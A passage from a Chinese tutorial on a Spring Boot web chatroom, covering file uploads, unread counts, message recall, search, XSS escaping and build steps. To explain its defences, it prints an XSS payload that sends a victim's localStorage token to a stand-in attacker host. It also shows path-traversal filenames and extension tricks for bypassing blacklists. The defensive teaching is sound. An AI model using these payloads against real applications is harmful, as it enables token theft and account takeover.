> 严格说前端这步在 `no-cache` 存在时是冗余的。但**两个地方都做**的原因是：
> 万一以后有人把 `no-cache` 改掉了（觉得"加缓存能提速"），前端这层还在，不会静默坏掉。
> **防御性设计：一个正确性依赖两个独立机制时，改坏一个不会立刻出问题，只会慢一点。**

**③ 上传时必须 `contentType: false`**

```javascript
let fd = new FormData();
fd.append('file', file);
$.ajax({
    type: 'post', url: '/user/avatar',
    data: fd,
    processData: false,     // 不要让 jQuery 去序列化 FormData
    contentType: false,     // 让它自己带 multipart 边界
    ...
});
```

`contentType: false` 不只是"让浏览器自己设置 `multipart/form-data; boundary=...`"，它还有个副作用：

> **jQuery 在手动指定了 `contentType` 时会覆盖 `$.ajaxSetup` 里设的请求头。**
>
> 本项目 `$.ajaxSetup` 里全局带了 `User-Token`。如果这里写 `contentType: 'multipart/form-data'`，
> JQuery 就会把 `User-Token` **一起覆盖掉** → 服务端收到一个没有 token 的上传请求 → 401。
>
> 症状是"所有接口都正常，只有上传头像 401"。**`contentType: false` 同时解决了这两个问题。**

---

### 11.3 未读提示（回指第 8.4 节）

未读是本项目**技术含量最高**的一个功能，已经在 8.4 节完整讲过了。这里只做一个提纲，方便你回忆：

| 要点 | 内容 |
|---|---|
| **存储** | `message_session_user.last_read_message_id`，存"读到哪条了" |
| **不用 boolean `is_read`** | 一条消息要给 N 个成员各记一个已读状态，用 boolean 就是 N 张表或 N 列 |
| **用 `message_id` 不用 `post_time`** | `post_time` 是 `datetime`（无小数秒），同一秒内多条消息分不出先后 |
| **未读数公式** | `message_id > 游标 and from_id <> 我` 的条数 |
| **UPDATE 必须带前进守卫** | `and last_read_message_id < #{messageId}` —— 防倒退 + 幂等 + 并发安全 |
| **未读数由后端给权威值** | 广播时按成员分别构造 payload，只给"非发送者"带 `unreadCount` |
| **撤回不减未读** | 和微信一致（撤回仍占一条未读），SQL 里有意不加 `and revoked = 0` |
| **会话列表统计用 `left join`** | `count(m.message_id)` + 条件写 `on` 里（不是 `where`，否则 0 未读的会话会整行消失） |

**面试里怎么讲：**

> "未读我用游标法。`message_session_user` 上有个 `last_read_message_id`，记录这个人在这个会话读到哪条。
> 未读数就是'这个会话里 id 大于游标、且不是我发的'的条数。
>
> 三个关键点：一，游标用自增主键不用时间戳，因为 MySQL 的 `datetime` 没有小数秒，同一秒的多条消息排序是不确定的；
> 二，更新游标时 SQL 带 `last_read_message_id < ?` 前进守卫，防止慢请求后到把已读位置倒退回去，
> 顺带提供了幂等和并发安全；三，未读数由后端算好推给前端，不让前端自己 +1 ——
> 前端加会在刷新页面、消息撤回、多标签页这几个场景算错。"

---

### 11.4 图片消息（回指第 9.5 节）

核心设计是**上传和发送拆成两步**：

```
第 1 步  POST /message/image   （multipart，同步）
         → 服务端存文件，返回 {"url": "/upload/chat/4_9f2c1a3b5d7e.png"}

第 2 步  WebSocket 发消息       （content = 上面那个 url，contentType = 2）
```

**为什么要拆？**

如果合并成"在 WebSocket 里传二进制图片"：

| 问题 | 说明 |
|---|---|
| 失败原因说不清 | WS 是单向流，图片太大/格式不对要报错，你得自己设计一套错误回执协议 |
| 没有 HTTP 状态码 | 上传失败想返 413（太大），WS 里只能塞进 `content` 字段当文案 |
| 前端体验差 | 用 HTTP 的话，`xhr.upload.onprogress` 直接就有上传进度条；WS 里要自己切分片做 |

**拆开之后**：上传走 HTTP（有状态码、有进度条、有明确的错误消息），发送走 WS（只传一个 30 字符的 URL）。

服务器侧的实现只有一行 —— **复用同一个存储服务，只换个子目录**：

```java
@Override
public String uploadImage(Integer userId, MultipartFile file) {
    // 复用同一个存储服务，只是换个子目录。ownerId 用 userId，文件名不会撞。
    return fileStorageService.saveImage(file, Constant.CHAT_IMAGE_DIR, userId);
}
```

**一个容易漏的校验**（见 9.2 节的 `sendMessage`）：`content` 以 `/upload/` 开头。

```java
// 图片消息的 content 必须是我们自己的上传目录下的路径
if (Constant.MSG_TYPE_IMAGE == msgType
        && !content.startsWith(Constant.UPLOAD_URL_PREFIX + "/")) {
    throw new UserException("非法的图片地址");
}
```

**不加这个校验会怎样？**

前端构造一条 `contentType=2, content="javascript:alert(1)"` 的消息发出去 —— 接收方的渲染逻辑是"图片消息就 `<img src=content>`"，于是渲染出一个 `src="javascript:alert(1)"` 的 img。

虽然现代浏览器 `<img src="javascript:...">` 已经不会执行了（只有 `<a href>` 这类才会），但**同样的漏洞换成 `<img src="http://攻击者.com/追踪像素.png">` 就成立了** —— 每次有人打开这个会话，都会向攻击者的服务器发一个请求，泄露"这个人在线、在这个时间看了这个会话"。

**这就是"图片消息的 content 必须限定在自己的上传目录下"的真正原因：它是防 SSRF / 隐私追踪的最后一道闸。**

---

### 11.5 消息搜索（回指第 9.4 节）

一句话总结：**权限隔离靠 join，不靠 where。**

```sql
-- 🔴 那个 and msu.user_id = #{userId} 写在 on 里，它就是安全边界
  from message m
  join message_session_user msu
       on msu.session_id = m.session_id
      and msu.user_id   = #{userId}
```

如果写成"先查所有消息、再用 where 过滤"，那么：

1. 你得先把**全表消息**捞出来（性能灾难）
2. 过滤条件写错一个字（比如用了 `or`）就是**全站消息泄露**

而 join 版本的语义是"**在'我参与的会话'这个集合里找**" —— 不满足条件的行从根上就进不了结果集。

---

### 11.6 消息撤回（回指第 9.3 节）

同样一句话总结：**软删除 + 两道闸。**

| 要点 | 内容 |
|---|---|
| **软删除** | `message.revoked` 标记，不物理 delete —— 要在双方界面留"XX 撤回了一条消息"的痕迹 |
| **必须软删除的另一个理由** | 物理删了就查不到原发布时间，**时间窗口校验没法做** |
| **第一道闸（读校验）** | Service 里 `select` 出来逐项检查：不存在 / 不是你的 / 已撤过 / 超时 → 给**能看懂的错误原因** |
| **第二道闸（写守卫）** | UPDATE 带 `from_id` + `revoked = 0` + `post_time >= deadline` → 防并发 |
| **为什么要两道** | 两个标签页同时点撤回，会**双双通过读校验**，所以写的时候必须再判一次 |
| **原文不下发** | 历史消息 SQL 用 `case when m.revoked = 1 then null else m.content end` |
| **时间窗口只认服务端** | `Constant.REVOKE_WINDOW_MINUTES`（后端说了算）和 `client.js` 的 `REVOKE_WINDOW_MS`（只决定按钮显不显示）必须同步改 |
| **撤回走 HTTP，通知走 WS** | HTTP 是为了能返回明确的失败原因（400 + 文案）；WS 是为了广播给所有人 |

---

### 11.7 六项扩展的横向小结

| 功能 | 一句话考点 |
|---|---|
| 群聊 | 单聊是成员数为 2 的会话 → 不需要新表 |
| 头像 | 独立接口 + 不动任何 SQL + 破坏性操作放最后 |
| 未读 | 游标法 + 前进守卫 + 后端权威 |
| 图片 | 上传发送拆两步 + content 限自家目录 |
| 搜索 | join 就是安全边界 |
| 撤回 | 软删除 + 两道闸 + 原文不下发 |

---

## 第 12 章 · 文件上传与静态资源映射

这一章讲清一个完整链路：**用户选一张图 → 存到磁盘 → 数据库存路径 → 浏览器能通过 URL 拿到它。**

### 12.1 接口设计

```java
public interface FileStorageService {

    /**
     * 保存一张上传的图片，返回可直接访问的相对 URL。
     *
     * @param file    上传的文件
     * @param subDir  子目录，见 Constant.AVATAR_DIR / CHAT_IMAGE_DIR
     * @param ownerId 用来拼文件名前缀（自己的 id），不同用户的文件不会同名
     */
    String saveImage(MultipartFile file, String subDir, Integer ownerId);

    /** 把数据库里存的 URL 反查成可读的资源，找不到返回 null */
    Resource loadAsResource(String url);

    /** 删除一个之前保存的文件（换头像时清掉旧图）。尽力而为，失败只记日志不抛异常 */
    void deleteQuietly(String url);
}
```

**注意 `subDir` 是一个参数，不是写死的。**

头像传 `"avatar"`，聊天图片传 `"chat"`。这样一个接口服务两种场景，不用写两遍。

**为什么定义成接口？**

因为"存本地磁盘"只是当前选择。真上线应该换成 OSS（对象存储）。**换成 OSS 实现时，只有这个接口的实现类换掉，所有调用方一行都不用改。**

> 这就是"面向接口编程"在这个项目里最实在的一次应用 —— 不是教条，是真的会换。

### 12.2 完整实现

```java
@Slf4j
@Service
public class FileStorageServiceImpl implements FileStorageService {

    /** 白名单。不要用黑名单挡 jsp/exe —— 漏一个就是一个漏洞，只放行已知安全的格式 */
    private static final Set<String> ALLOWED_EXT = Set.of("jpg", "jpeg", "png", "gif", "webp");

    private static final long MAX_SIZE = 5 * 1024 * 1024L;

    /** 上传根目录（绝对路径） */
    private final Path root;

    public FileStorageServiceImpl(@Value("${file.upload-dir:./upload}") String uploadDir) throws IOException {
        // toAbsolutePath().normalize() 把 ./upload 变成绝对路径、把 a/../b 化简成 b
        this.root = Paths.get(uploadDir).toAbsolutePath().normalize();
        Files.createDirectories(root);
        log.info("上传根目录：{}", root);
    }

    @Override
    public String saveImage(MultipartFile file, String subDir, Integer ownerId) {
        // ① 空文件
        if (file == null || file.isEmpty()) {
            throw new UserException("请选择要上传的图片");
        }
        // ② 大小
        if (file.getSize() > MAX_SIZE) {
            throw new UserException("图片太大了，最多 5MB");
        }

        // ③ 扩展名白名单
        String ext = extensionOf(file.getOriginalFilename());
        if (!ALLOWED_EXT.contains(ext)) {
            throw new UserException("只支持 jpg / png / gif / webp 格式的图片");
        }

        // ④ 🔴 文件名完全由服务端生成，用户传上来的原始文件名一个字都不用。
        String filename = ownerId + "_" + UUID.randomUUID().toString().replace("-", "").substring(0, 12)
                + "." + ext;

        Path dir = root.resolve(subDir).normalize();
        // ⑤ 双保险：即使 subDir 被污染，解析出来的目录也必须还在根目录内
        if (!dir.startsWith(root)) {
            throw new UserException("非法的上传目录");
        }

        try {
            Files.createDirectories(dir);
            file.transferTo(dir.resolve(filename));
        } catch (IOException e) {
            log.error("保存上传文件失败：{}", e.getMessage(), e);
            throw new UserException("图片保存失败，请稍后重试");
        }

        String url = Constant.UPLOAD_URL_PREFIX + "/" + subDir + "/" + filename;
        log.info("文件已保存：{}", url);
        return url;
    }
    // ... loadAsResource / deleteQuietly / resolve / extensionOf 见下
}
```

### 12.3 五个不能省的检查

按危险程度从高到低排：

#### 🔴 ① 文件名由服务端生成（防目录穿越 + 防上传可执行脚本）

```java
String filename = ownerId + "_" + UUID.randomUUID().toString().replace("-", "").substring(0, 12)
        + "." + ext;
// → 例：4_9f2c1a3b5d7e.png
```

**如果用用户传上来的原始文件名 `file.getOriginalFilename()`：**

| 恶意文件名 | 后果 |
|---|---|
| `../../application.yml` | **目录穿越** —— 覆盖应用的配置文件的路径，把配置写坏 |
| `shell.jsp` | 上传一个可执行脚本。当前项目打的是 jar、没有 JSP 引擎所以打不开，**但换成 war 部署就是 RCE（远程命令执行）** |
| `a.png.exe` | 双扩展名，某些 Windows 服务器配置下会被当 exe |

**只要文件名是服务端生成的，这三个问题一次性消失** —— 因为用户输入**根本没有参与文件名的构造**。

> 这是安全设计里的一个通用手法：**不是"过滤危险输入"，而是"让用户输入不参与危险操作"**。
> 前者永远有漏网之鱼（黑名单），后者从根上不可能出错。

#### 🔴 ② 扩展名白名单，不是黑名单

```java
private static final Set<String> ALLOWED_EXT = Set.of("jpg", "jpeg", "png", "gif", "webp");
```

**别写成"挡掉 exe/jsp/sh/bat"。** 黑名单的致命问题：**你永远不知道自己漏了什么**。

- 漏了 `.phtml`？漏了 `.jspx`？漏了 `.htaccess`？
- 攻击者还可以用 `.PHP`（大小写）、`.php.`（结尾点，某些系统会忽略）、`.php::$DATA`（Windows NTFS 特性）

白名单的思路是**反过来的**：只有这 5 种是"我知道安全的"，其余全部拒绝。**新格式自动被拒，不需要维护。**

**顺带：`extensionOf` 要 `toLowerCase(Locale.ROOT)`。**

```java
private String extensionOf(String originalFilename) {
    if (!StringUtils.hasText(originalFilename)) {
        return "";
    }
    int idx = originalFilename.lastIndexOf('.');
    if (idx < 0 || idx == originalFilename.length() - 1) {
        return "";      // 没扩展名 / 以点结尾
    }
    return originalFilename.substring(idx + 1).toLowerCase(Locale.ROOT);
}
```

不转小写的话，`PHOTO.PNG` 会被白名单拒掉 —— 用户上传一张正常的大写扩展名图片却被拒，体验很怪。

> `Locale.ROOT` 而不是 `toLowerCase()`（无参）的原因：土耳其语的 `I`/`i` 大小写转换有特例，
> 用系统默认 locale 在某些环境下会把 `I` 转成 `ı`。**涉及"机器判断"的字符串转换一律用 `Locale.ROOT`，只有面向人显示的才用系统 locale。**

#### 🔴 ③ 双向目录校验

上传时：

```java
Path dir = root.resolve(subDir).normalize();
if (!dir.startsWith(root)) {                    // ← 校验 1
    throw new UserException("非法的上传目录");
}
```

反解时（`resolve(url)`）：

```java
private Path resolve(String url) {
    if (!StringUtils.hasText(url) || !url.startsWith(Constant.UPLOAD_URL_PREFIX + "/")) {
        return null;
    }
    String relative = url.substring(Constant.UPLOAD_URL_PREFIX.length() + 1);
    Path path = root.resolve(relative).normalize();
    return path.startsWith(root) ? path : null;  // ← 校验 2
}
```

**为什么要两处都校验？**

- 上传时校验：防**这次请求**的 `subDir` 被污染
- 反解时校验：**数据库里的值也可能是脏的**（早期版本的 bug 写进去的、或者有人直接改库）

**第二处更容易被忽略** —— 大家通常只防"用户输入"，忘了"数据库里的历史数据"同样不可信。

**注意 `normalize()` 必须有**：`root.resolve("../etc/passwd").normalize()` 会化简成 `/etc/passwd`，然后 `startsWith(root)` 就返回 false，被挡住。**没有 `normalize()` 的话 `startsWith` 比对的是未化简的路径，形同虚设。**

#### ④ 大小限制

```java
private static final long MAX_SIZE = 5 * 1024 * 1024L;   // 5MB
```

**两层限制，缺一不可：**

| 层 | 配置 | 作用 |
|---|---|---|
| 应用层 | `spring.servlet.multipart.max-file-size: 5MB` | 单个文件上限 |
| | `spring.servlet.multipart.max-request-size: 10MB` | 整个请求上限 |
| 业务层 | `MAX_SIZE` 常量 | 能返回**友好文案**（"图片太大了，最多 5MB"） |

只配 Spring 的话，超限抛 `MaxUploadSizeExceededException` → 前端只能看到一个笼统的错误；只写业务层的话，**文件已经被读进内存了**，一个 2GB 的文件能直接把 JVM 撑爆。

> **`max-request-size` 要 ≥ `max-file-size`**：因为 multipart 请求除了文件还有边界字符串、其他表单字段。
> 两个都设 5MB 的话，一个正好 5MB 的文件会**因为边界字符而超限**被拒 —— 这种"差一点点就成功"的 bug 特别难查。

#### ⑤ `resolve` 的返回值刻意区分 null 和异常

```java
private Path resolve(String url) {
    // 格式不对 → 返回 null（不是一个"错误"，只是"这里没有文件"）
    if (!StringUtils.hasText(url) || !url.startsWith(Constant.UPLOAD_URL_PREFIX + "/")) {
        return null;
    }
    ...
    return path.startsWith(root) ? path : null;   // 越界 → 也返回 null
}
```

调用方拿到 null 就当作"没有这个文件"处理：

- `loadAsResource` 返回 null → Controller 返 404
- `deleteQuietly` 直接 return

**为什么用 null 而不是抛 `UserException`？**

因为 `resolve` 被"读取"链路调用 —— 而 `user.getAvatar()` 为 null 是**完全正常的状态**（新用户从来没设过头像）。如果这里抛异常，新用户一打开页面看到头像请求报 500，日志里刷满异常。

**"没有"不是"错误"。** 只有"不该有却有"才叫错误。

### 12.4 `UploadConfig`：把磁盘目录映射成 URL

```java
@Configuration
public class UploadConfig implements WebMvcConfigurer {

    private final String uploadDir;

    public UploadConfig(@Value("${file.upload-dir:./upload}") String uploadDir) {
        this.uploadDir = uploadDir;
    }

    @Override
    public void addResourceHandlers(ResourceHandlerRegistry registry) {
        // 必须用 file: 前缀明确指出这是文件系统路径，
        // 否则 Spring 会当成 classpath 资源去找，结果永远是 404。
        // 结尾的 / 也不能省，少了它拼接出来的路径会缺一层目录。
        String location = Paths.get(uploadDir).toAbsolutePath().normalize().toUri().toString();
        if (!location.endsWith("/")) {
            location = location + "/";
        }
        registry.addResourceHandler(Constant.UPLOAD_URL_PREFIX + "/**")
                .addResourceLocations(location);
    }
}
```

**两个"少一个字就废"的细节：**

#### 🔴 坑 1：必须用 `file:` 前缀

`addResourceLocations` 的默认前缀是 **`classpath:`**。

所以 `addResourceLocations("/opt/chatroom/upload/")` 会被解释成"去 jar 包里找 `/opt/chatroom/upload/`"—— **永远 404**。

而且这个 404 特别难查：日志里一点异常都没有，就是取不到文件。

**正确写法是 `file:/opt/chatroom/upload/`。**

### 🔴 坑 2：结尾必须是 `/`

Spring 内部拼接路径是 `location + relativePath`，是**字符串拼接**，不是 `Path.resolve()`。

所以：

```
location = "file:/opt/chatroom/upload"    （少了结尾 /）
请求      /upload/avatar/4_xxx.png
          ↓
实际找    /opt/chatroom/uploadavatar/4_xxx.png     ← 路径粘在一起，少一层目录！
```

**这就是那 4 行 `if (!location.endsWith("/"))` 存在的全部原因。**

> 本项目这里其实是"预防性"的：`Paths.toUri().toString()` 对目录路径本来就以 `/` 结尾。
> 但那行守卫留着 —— 因为**哪天从 `"file:..."` 字符串手工拼 location 时（比如改成 OSS 的 URL），结尾这个 `/` 就没人保证了**。

### 12.5 完整链路的三个坑串起来

用户上传一张聊天图片时，完整链路是：

```
① 前端  POST /message/image  (multipart, 带 User-Token)
        ↓
② 拦截器  校验 token → 放行（这个接口不在放行清单里，必须带 token）
        ↓
③ Controller  从 request 域取 userId（不从参数取）
        ↓
④ Service  fileStorageService.saveImage(file, "chat", userId)
           · 白名单校验扩展名
           · 服务端生成文件名
           · 目录越界校验
           · 写盘
           · 返回 "/upload/chat/4_9f2c1a3b5d7e.png"
        ↓
⑤ 前端  WebSocket 发消息  { sessionId, content: "上面那个 url", contentType: 2 }
        ↓
⑥ 服务端 校验 content.startsWith("/upload/")  ← 防 SSRF / 追踪像素
        落库 → 广播给会话内所有人
        ↓
⑦ 接收方  渲染 <img src="/upload/chat/4_9f2c1a3b5d7e.png">
        ↓
⑧ 浏览器原生请求  GET /upload/chat/...
        ↓
⑨ 拦截器  🔴 必须放行 /upload/**（<img> 带不了 User-Token）
        ↓
⑩ UploadConfig 的映射  → 读磁盘文件 → 返回图片
```

**三个坑分别落在 ②⑨、④、⑩：**

| 位置 | 坑 | 症状 |
|---|---|---|
| ② | 上传接口**不能**放行 | 放行了 → 任何人都能往你服务器写文件 |
| ⑨ | 读图片接口**必须**放行 | 不放行 → 满屏破图（因为 `<img>` 带不了请求头） |
| ④ | 文件名必须服务端生成 | 用原始文件名 → 目录穿越 / 上传脚本 |
| ⑩ | 必须 `file:` + 结尾 `/` | 少了 → 上传成功但永远看不到图 |

> **"上传要鉴权、读取不鉴权"这个不对称是刻意的**，也是被迫的：
> 写入是破坏性操作，必须证明你是谁；读取受限于浏览器 `<img>` 的能力 —— 它没法带自定义头。
> 代价是"图片 URL 泄露即永久可访问"，这条已经写进第 17 章的已知不足。

---

## 第 13 章 · 前端契约（只讲必须知道的部分）

> 按需求，前端布局和 CSS 全部略过。这一章只讲**和后端有强耦合**的几处 —— 你换一套前端框架时，这几件事仍然必须做对。

### 13.1 全局带 token

```javascript
$.ajaxSetup({
    headers: { 'User-Token': localStorage.getItem('token') || '' }
});
```

**为什么放在 `$.ajaxSetup` 而不是每个请求里写？**

因为项目有 21 个接口。放在全局，新增接口自动就有 token，**不会漏**。

**⚠️ 但有一个已知的例外**（见 11.2.5）：手动指定 `contentType` 时 jQuery 会覆盖全局头。**上传 FormData 必须写 `contentType: false`。**

### 13.2 全局处理 401

```javascript
$(document).ajaxError(function(event, xhr) {
    if (xhr.status === 401) {
        localStorage.removeItem('token');
        localStorage.removeItem('userId');
        localStorage.removeItem('username');
        alert('登录已过期，请重新登录！');
        location.assign('/login.html');
    }
});
```

**绑定在 `document` 上，而不是每个 ajax 的 error 回调里。**

好处：任何接口（包括以后新加的）返回 401，都会自动清 token 并跳登录页。各接口的 error 回调里只需要写：

```javascript
error: function(xhr) {
    if (xhr.status !== 401) { alert("获取用户信息失败！"); }   // ← 401 已被全局接走，别重复弹
    location.assign('/login.html');
}
```

> **那个 `if (xhr.status !== 401)` 不是多余判断。** 不加的话用户会连弹两次 alert（一次"登录已过期"、一次"获取用户信息失败"）。
> 这类"全局兜底 + 局部处理"的组合，**局部永远要先排除全局已经处理过的情况**。

### 13.3 `buildWsUrl()`：一处写对，HTTP → HTTPS 零改动

```javascript
function buildWsUrl() {
    // 改 HTTPS 时 WS 自动跟着走 WSS —— 部署时不用改代码
    const proto = location.protocol === 'https:' ? 'wss://' : 'ws://';
    // 浏览器原生 WebSocket 不支持自定义请求头，User-Token 那套用不了，
    // token 只能挂在 URL query 上
    return proto + location.host + '/ws/message?token='
         + encodeURIComponent(localStorage.getItem('token') || '');
}
```

**用 `location.host` 而不是写死 IP 和端口。**

这一行的价值：**本地开发（`localhost:8080`）和线上（`101.42.2.204:8082`）用同一份代码，零配置切换。**

如果写死 `ws://101.42.2.204:8082/ws/message`，本地开发时就连到线上去发消息了。

**`encodeURIComponent` 不能省** —— JWT 是 Base64URL 编码的，含 `-` 和 `_`，但万一以后换成标准 Base64（含 `+` 和 `/`），不编码就会把 URL 拆坏。

### 13.4 `escapeHtml`：唯一一处防 XSS 的地方

```javascript
function escapeHtml(text) {
    let div = document.createElement('div');
    div.appendChild(document.createTextNode(text == null ? '' : text));
    return div.innerHTML;
}
```

**用法：所有渲染用户内容的地方都要过一遍。**

```javascript
msgEl.innerHTML = '<span>' + escapeHtml(message.content) + '</span>';
```

**不转义会怎样？**

用户在聊天框里发 `<img src=x onerror="fetch('http://攻击者.com?c='+localStorage.token)">`。

对方一打开这个会话，**jQuery 用 `innerHTML` 插进去 → 浏览器解析这个 `<img>` → `onerror` 触发 → token 被发到攻击者服务器** → 攻击者拿着 token 就能冒充对方登录。

**这是聊天室这类应用最经典的 XSS 攻击面** —— 因为"渲染别人发的文本"就是它的核心功能。

**为什么用 `createTextNode` 而不是手写 `replace(/</g, '&lt;')`？**

因为手写替换的转义表**永远漏**：

- 不转 `&` → 用户可以构造 `&lt;script&gt;` 让浏览器当成 `<script>` 解析
- 不转 `"` 和 `'` → 如果用在属性位置就会逃逸

`createTextNode` + `innerHTML` 是**浏览器自己在做转义**，规则和它解析时用的规则**完全一致** —— 不可能漏。

> **这是防 XSS 的一个通用原则：转义逻辑要交给"和解析逻辑同一来源"的东西来做。** 自己写正则替换，本质是在猜浏览器怎么解析。

### 13.5 唯一需要自研的地方：`parseServerTime`

```javascript
function parseServerTime(timeStr) {
    if (!timeStr) return null;
    let parts = timeStr.split(' ');              // "2026-09-24 21:17:03"
    if (parts.length < 2) return null;
    let d = parts[0].split('-'), t = parts[1].split(':');
    if (d.length < 3 || t.length < 2) return null;
    return new Date(+d[0], +d[1] - 1, +d[2], +t[0], +t[1], +(t[2] || 0));
}
```

**为什么不直接 `new Date("2026-09-24 21:17:03")`？**

因为**这个字符串在 Safari 里会返回 `Invalid Date`**。

`"2026-09-24 21:17:03"` 不是标准的 ISO 8601 格式 —— 标准要求 `T` 分隔（`2026-09-24T21:17:03`），空格分隔是"历史遗留格式"。Chrome 和 Firefox 出于兼容会容错解析，**Safari 严格按规范走，直接判无效**。

**症状特别隐蔽**：Windows + Chrome 上开发一切正常，同事拿 iPhone 一测 —— 撤回按钮永远不显示（因为 `withinRevokeWindow` 里 `parseServerTime` 返回 null）。

**解法就是手工拆字段，用 `new Date(year, monthIndex, ...)` 这个"全数字参数"的构造函数** —— 它是规范定义的，所有浏览器行为一致。

**注意 `+d[1] - 1`：JavaScript 的月份是从 0 开始的。** 这是最容易写错的一个 off-by-one —— 少写 `-1` 的话所有时间都会往前偏一个月。

### 13.6 `initWebSocket()` 必须幂等

```javascript
function connectWebSocket() {
    if (wsClosedByUser) return;
    // 已经连着、或正在连，就别重复建 —— 否则会同时存在多条连接，
    // 服务端那边看着像"多标签页"，推送就重复了
    if (websocket && (websocket.readyState === WebSocket.OPEN
                   || websocket.readyState === WebSocket.CONNECTING)) return;
    ...
}
```

**这个函数会被好几个入口调用**：登录成功、重连成功、切换会话、页面从后台切回来。

不幂等的话会开出多条连接。而服务端的 `OnlineUserManager` 用的是 `Map<Integer, Set<WebSocketSession>>`（**支持多标签页**，见 10.3 节）—— 它**无法区分**"两条连接是两个标签页"还是"一个标签页开了两条"。

所以推送会**重复**。症状是：**发一条消息，界面上出现两条。**

> **这个坑的深层原因值得记住：当服务端为了支持某个特性（多标签页）而故意放宽约束时，
> 客户端就必须承担"不要滥用这个宽松度"的责任。**
> 双方各管一半，任何一方偷懒都会出 bug。

---

## 第 14 章 · 打包与本地自测

### 14.1 打包

本项目用 IntelliJ 内置的 Maven，**`mvn` 不在 PATH 上**，必须写全路径：

```bash
cd /d E:\JavaEE-learn\web-chatroom\chatroom
"E:\IntelliJ IDEA 2026.2.2\plugins\maven-plugin\lib\maven3\bin\mvn.cmd" -o -B clean package -DskipTests
```

参数说明：

| 参数 | 作用 |
|---|---|
| `-o` | 离线模式，不联网查更新（依赖都在 `~/.m2/repository` 了，离线更快也更稳） |
| `-B` | 批处理模式，不打进度条、不用 ANSI 颜色（日志干净，适合贴到文档里） |
| `clean package` | 先删 `target/` 再打包 |
| `-DskipTests` | 跳过测试（本项目 `src/test` 是空的，但跳过能省时间也避免踩测试环境的坑） |

产物：`target/web-chatroom-0.0.1-SNAPSHOT.jar`，约 **33 MB**。

> **33 MB 里绝大部分是依赖**（Spring Boot + MyBatis-Plus + MySQL 驱动 + jjwt）。
> `spring-boot-maven-plugin` 的 `repackage` 目标把 `app.jar` 和所有依赖包打进一个"fat jar"里，
> 这就是为什么它能 `java -jar` 直接跑 —— 不需要 `-cp` 指定 classpath。

**两个必踩的坑：**

**① 忘了写全路径** → `'mvn' 不是内部或外部命令`。

**② 忘了 `cd` 到项目目录** → cmd.exe 默认开在 `C:\Users\a`，在那儿跑 `mvn package` 会报"找不到 pom.xml"，跑 `scp target/xxx.jar` 会报 `No such file or directory`。

### 14.2 本地起服务自测

```bash
cd /d E:\JavaEE-learn\web-chatroom\chatroom
"E:\IntelliJ IDEA 2026.2.2\plugins\maven-plugin\lib\maven3\bin\mvn.cmd" -o -B spring-boot:run -Dspring-boot.run.arguments=--server.port=18080
```

**为什么要用 `-Dspring-boot.run.arguments` 指定端口？**

因为某些执行环境（比如本项目的开发沙箱）会往进程里**注入一个随机的 `SERVER_PORT` 环境变量**。而环境变量优先级高于 `application.yml`，所以不显式覆盖的话，你以为访问 8080，实际监听在一个随机端口上。

**注意这个参数的值里不能有空格。** `["--server.port=18080","--xxx=yyy"]` 这种带空格的写法在 Windows cmd 下会被拆坏，多个参数用逗号分隔（`-Dspring-boot.run.arguments=--a=1,--b=2`）。

或者更省事 —— **直接在 IntelliJ 里点绿三角跑，在 Run Configuration 里加 VM/程序参数**。

### 14.3 本地自测清单

**单人自测（起服务后）：**

| # | 检查 | 期望 |
|---|---|---|
| 1 | 访问 `http://127.0.0.1:18080/login.html` | 页面正常 |
| 2 | 不带 token 访问 `http://127.0.0.1:18080/user/userInfo` | **HTTP 401** + `{"code":401,"message":"..."}` |
| 3 | 用错密码登录 | **HTTP 400**（不是 200）+ 明确的原因 |
| 4 | 访问不存在的路径 `/user/xxx` | **HTTP 404**（不是 500） |
| 5 | POST 一个 GET 接口 | **HTTP 405**（不是 500） |
| 6 | 发一个格式错误的 JSON | **HTTP 400**（不是 500） |
| 7 | 上传一个 6MB 的图片 | **HTTP 413** |
| 8 | 上传一个 `.exe` | 400 + "只支持 jpg / png / gif / webp" |
| 9 | 注册一个新用户 | 返回 `userId` **不是 null**（这条验的就是 6.2 节的 `@TableId`） |

> **第 3–7 条就是在验第 4.2 章那三个异常处理的坑。** 它们全都是"能跑但会用错误的方式报错"的问题 ——
> 不主动测的话，等到线上出问题才发现"前端 alert 从来没弹出过"。

**双人自测：**

**必须用无痕窗口**（`Ctrl+Shift+N`）。因为同一个浏览器的两个标签页**共用 `localStorage`** —— 第二个登录会覆盖第一个的 token，结果两个窗口都是同一个人，测不出互发。

| # | 操作 | 期望 |
|---|---|---|
| 1 | 普通窗口登录 `wangwu` | 进聊天页 |
| 2 | 无痕窗口登录 `xiaodudu` | 进聊天页 |
| 3 | 点好友发一条文本 | **两个窗口都立刻出现**（含发送者自己 → 验 10.3 节的广播设计） |
| 4 | 反向发一条 | 同上 |
| 5 | 发一张图片 | 对方看到图片（**不是一串路径**） |
| 6 | 2 分钟内点自己那条消息 → 撤回 | 两边都变成"撤回了一条消息" |
| 7 | 搜索刚发过的关键字 | 搜得到 |
| 8 | 建群并拉人 | 被拉的人会话列表**自动出现**新群（不刷新页面） |
| 9 | 换头像 | 立刻生效（不刷新页面） |
| 10 | 服务端 `Ctrl+C` 停掉 → 再起 | 前端 60 秒内自动重连，且**补拉了断线期间的消息** |

### 14.4 一个本沙箱专用的技巧（前端大改时很有用）

**本项目的开发沙箱跑不了 headless 截图** —— Chrome / Edge 一律报 `Abnormal renderer termination`。

所以"改完 CSS 想先看看效果"用的是一套**假数据页 + iframe 画廊**：

```bash
python -m http.server 18099 --bind 127.0.0.1 --directory src/main/resources/static
# 然后浏览器打开 http://127.0.0.1:18099/_mpreview.html
```

- `_mcheck.html` —— 照 `client.html` 复制一份，**把假数据硬编码进去**，**刻意不引 jQuery / client.js**（否则那些 404 会把假数据冲掉），用 `#hash` 切换不同状态
- `_mpreview.html` —— 把 `_mcheck.html` 塞进一个 `390×844` 的 iframe

**为什么 iframe 有用？** 因为 **CSS 媒体查询是按 iframe 自身的宽度生效的** —— 一个 390px 宽的 iframe 就等于真实手机渲染。

**⚠️ 两个局限：**

1. 看不到 `@media (hover: none) and (pointer: coarse)` 里的规则 —— 桌面浏览器不满足这个条件，**触屏专属项（输入框字号、长按手势）只能真机验证**
2. 这些 `_m*.html` 是临时文件，**验收完要删，别留在 `static/` 里**（本项目就曾把这两个文件打进线上 jar）

### 14.5 本地验证和生产验证的差别

| 维度 | 本地 | 线上 |
|---|---|---|
| 数据库 | 本地 MySQL，随便改 | **不能随便改**，改表结构要走迁移脚本 |
| 静态资源 | dev profile 指向 `file:src/main/resources/static/`（改完刷新生效） | prod profile 从 **jar 内 classpath** 读（**改前端要重新打包**） |
